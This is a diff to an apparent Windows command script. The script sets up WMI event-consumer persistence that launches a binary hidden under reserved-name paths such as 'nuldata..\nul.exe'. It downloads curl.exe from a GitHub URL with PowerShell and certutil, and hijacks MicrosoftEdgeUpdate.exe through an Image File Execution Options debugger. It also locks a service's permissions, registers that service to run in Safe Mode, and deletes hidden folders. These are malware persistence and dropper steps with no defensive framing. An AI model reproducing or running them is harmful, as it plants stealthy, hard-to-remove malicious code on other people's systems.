@@ -1,14 +1,18 @@
 wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="LUN" DELETE
-powershell.exe -NoProfile -Command "Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter \"Name='LUN'\" | Remove-WmiObject"
+cmd.exe /c start "" powershell.exe -NoProfile -Command "Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter \"Name='LUN'\" | Remove-WmiObject"
 taskkill.exe /f /IM nul.exe
 wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="LUN", CommandLineTemplate="%ProgramData%\nuldata..\nul.exe %ProgramData%\nuldata..\nul"
-powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='LUN'; CommandLineTemplate='%ProgramData%\nuldata..\nul.exe %ProgramData%\nuldata..\nul'} | Out-Null"
-powershell.exe Invoke-WebRequest -Uri https://github.com/vltex/1/raw/1/0/curl.exe -OutFile C:\ProgramData\curl.exe
+cmd.exe /c start "" powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='LUN'; CommandLineTemplate='%ProgramData%\nuldata..\nul.exe %ProgramData%\nuldata..\nul'} | Out-Null"
+cmd.exe /c start "" powershell.exe Invoke-WebRequest -Uri https://github.com/vltex/1/raw/1/0/curl.exe -OutFile C:\ProgramData\curl.exe
 certutil -url""""cache -split -f "https://github.com/vltex/1/raw/1/0/curl.exe" "%ProgramData%\curl.exe"
-rd /S /Q \\.\%ProgramData%\NUL..\
-rd /S /Q \\.\%ProgramData%\config..\
-rd /S /Q "\\.\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeUpdate.exe" /v Debugger /t REG_SZ /d "\\.\%ProgramData%\prndata..\prn.exe \\.\%ProgramData%\prndata..\prn" /f
 sc sdset "OneSyncTask" "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\OneSyncTask" /VE /T REG_SZ /F /D "Service"
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\OneSyncTask" /VE /T REG_SZ /F /D "Service"
+rd /S /Q \\.\%ProgramData%\AUX..\
+rd /S /Q \\.\%ProgramData%\CON..\
+rd /S /Q \\.\%ProgramData%\NUL..\
+rd /S /Q \\.\%ProgramData%\config..\
+rd /S /Q \\.\%ProgramData%\logdata..\
+rd /S /Q \\.\%ProgramData%\diaglogs..\
+rd /S /Q "\\.\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
